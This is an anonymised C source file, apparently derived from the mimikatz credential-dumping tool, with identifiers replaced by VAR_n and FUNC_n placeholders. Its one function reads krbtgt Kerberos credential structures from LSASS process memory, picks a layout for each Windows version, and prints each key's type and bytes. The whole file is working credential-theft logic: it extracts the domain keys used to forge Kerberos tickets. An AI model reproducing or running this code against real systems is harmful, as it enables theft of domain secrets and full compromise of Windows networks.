
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_21__ TYPE_7__ ;
typedef struct TYPE_20__ TYPE_3__ ;
typedef struct TYPE_19__ TYPE_2__ ;
typedef struct TYPE_18__ TYPE_1__ ;
typedef struct TYPE_17__ TYPE_15__ ;


struct TYPE_21__ {TYPE_3__* address; int * member_1; TYPE_3__* member_0; } ;
struct TYPE_20__ {int cbCred; TYPE_2__* credentials; } ;
struct TYPE_19__ {int size; TYPE_3__* key; int type; } ;
struct TYPE_18__ {int MajorVersion; scalar_t__ BuildNumber; } ;
struct TYPE_17__ {TYPE_1__ osContext; int * hLsassMem; } ;
typedef TYPE_3__* PVOID ;
typedef TYPE_3__* PKIWI_KRBTGT_CREDENTIALS_64 ;
typedef TYPE_3__* PKIWI_KRBTGT_CREDENTIALS_6 ;
typedef TYPE_3__* PKIWI_KRBTGT_CREDENTIALS_5 ;
typedef int PCWSTR ;
typedef TYPE_7__ KULL_M_MEMORY_ADDRESS ;
typedef int KIWI_KRBTGT_CREDENTIAL_64 ;
typedef int KIWI_KRBTGT_CREDENTIAL_6 ;
typedef int KIWI_KRBTGT_CREDENTIAL_5 ;
typedef TYPE_3__ KIWI_KRBTGT_CREDENTIALS_64 ;
typedef TYPE_3__ KIWI_KRBTGT_CREDENTIALS_6 ;
typedef TYPE_3__ KIWI_KRBTGT_CREDENTIALS_5 ;
typedef size_t DWORD ;


 int VAR_0 ;
 scalar_t__ VAR_1 ;
 int VAR_2 ;
 void* FUNC_0 (int ,size_t) ;
 int FUNC_1 (TYPE_3__*) ;
 int FUNC_2 (int ) ;
 size_t FUNC_3 (int ) ;
 TYPE_15__ VAR_3 ;
 int FUNC_4 (char*,...) ;
 int FUNC_5 (int ) ;
 scalar_t__ FUNC_6 (TYPE_7__*,TYPE_7__*,size_t) ;
 int FUNC_7 (TYPE_3__*,size_t,int ) ;

void FUNC_8(PVOID VAR_4, PCWSTR VAR_5)
{
 DWORD VAR_6, VAR_7;
 KIWI_KRBTGT_CREDENTIALS_64 VAR_8, *VAR_9;
 KIWI_KRBTGT_CREDENTIALS_6 VAR_10, *VAR_11;
 KIWI_KRBTGT_CREDENTIALS_5 VAR_12, *VAR_13;
 KULL_M_MEMORY_ADDRESS VAR_14 = {VAR_4, VAR_3.hLsassMem}, VAR_15 = {&VAR_10, &VAR_0};

 if(VAR_4)
 {
  FUNC_4(L"\n%s krbtgt: ", VAR_5);
  if(VAR_3.osContext.MajorVersion < 6)
  {
   VAR_15.address = &VAR_12;
   if(FUNC_6(&VAR_15, &VAR_14, sizeof(KIWI_KRBTGT_CREDENTIALS_5) - sizeof(KIWI_KRBTGT_CREDENTIAL_5)))
   {
    VAR_6 = sizeof(KIWI_KRBTGT_CREDENTIALS_5) + (VAR_12 - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_5);
    if((VAR_13 = (PKIWI_KRBTGT_CREDENTIALS_5) FUNC_0(VAR_2, VAR_6)))
    {
     VAR_15.address = VAR_13;
     if(FUNC_6(&VAR_15, &VAR_14, VAR_6))
     {
      FUNC_4(L"%u credentials\n", VAR_13->cbCred);
      for(VAR_7 = 0; VAR_7 < VAR_13->cbCred; VAR_7++)
      {
       FUNC_4(L"\t * %s : ", FUNC_5(FUNC_2(VAR_13->credentials[VAR_7].type)));
       VAR_14.address = VAR_13->credentials[VAR_7].key;
       if((VAR_15.address = FUNC_0(VAR_2, FUNC_3(VAR_13->credentials[VAR_7].size))))
       {
        if(FUNC_6(&VAR_15, &VAR_14, FUNC_3(VAR_13->credentials[VAR_7].size)))
         FUNC_7(VAR_15.address, FUNC_3(VAR_13->credentials[VAR_7].size), 0);
        FUNC_1(VAR_15.address);
       }
       FUNC_4(L"\n");
      }
     }
     FUNC_1(VAR_13);
    }
   }
  }
  else if(VAR_3.osContext.BuildNumber < VAR_1)
  {
   VAR_15.address = &VAR_10;
   if(FUNC_6(&VAR_15, &VAR_14, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6)))
   {
    VAR_6 = sizeof(KIWI_KRBTGT_CREDENTIALS_6) + (VAR_10 - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_6);
    if((VAR_11 = (PKIWI_KRBTGT_CREDENTIALS_6) FUNC_0(VAR_2, VAR_6)))
    {
     VAR_15.address = VAR_11;
     if(FUNC_6(&VAR_15, &VAR_14, VAR_6))
     {
      FUNC_4(L"%u credentials\n", VAR_11->cbCred);
      for(VAR_7 = 0; VAR_7 < VAR_11->cbCred; VAR_7++)
      {
       FUNC_4(L"\t * %s : ", FUNC_5(FUNC_2(VAR_11->credentials[VAR_7].type)));
       VAR_14.address = VAR_11->credentials[VAR_7].key;
       if((VAR_15.address = FUNC_0(VAR_2, FUNC_3(VAR_11->credentials[VAR_7].size))))
       {
        if(FUNC_6(&VAR_15, &VAR_14, FUNC_3(VAR_11->credentials[VAR_7].size)))
         FUNC_7(VAR_15.address, FUNC_3(VAR_11->credentials[VAR_7].size), 0);
        FUNC_1(VAR_15.address);
       }
       FUNC_4(L"\n");
      }
     }
     FUNC_1(VAR_11);
    }
   }
  }
  else
  {
   VAR_15.address = &VAR_8;
   if(FUNC_6(&VAR_15, &VAR_14, sizeof(KIWI_KRBTGT_CREDENTIALS_64) - sizeof(KIWI_KRBTGT_CREDENTIAL_64)))
   {
    VAR_6 = sizeof(KIWI_KRBTGT_CREDENTIALS_64) + (VAR_8 - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_64);
    if((VAR_9 = (PKIWI_KRBTGT_CREDENTIALS_64) FUNC_0(VAR_2, VAR_6)))
    {
     VAR_15.address = VAR_9;
     if(FUNC_6(&VAR_15, &VAR_14, VAR_6))
     {
      FUNC_4(L"%u credentials\n", VAR_9->cbCred);
      for(VAR_7 = 0; VAR_7 < VAR_9->cbCred; VAR_7++)
      {
       FUNC_4(L"\t * %s : ", FUNC_5(FUNC_2(VAR_9->credentials[VAR_7].type)));
       VAR_14.address = VAR_9->credentials[VAR_7].key;
       if((VAR_15.address = FUNC_0(VAR_2, FUNC_3(VAR_9->credentials[VAR_7].size))))
       {
        if(FUNC_6(&VAR_15, &VAR_14, FUNC_3(VAR_9->credentials[VAR_7].size)))
         FUNC_7(VAR_15.address, FUNC_3(VAR_9->credentials[VAR_7].size), 0);
        FUNC_1(VAR_15.address);
       }
       FUNC_4(L"\n");
      }
     }
     FUNC_1(VAR_9);
    }
   }
  }
 }
}
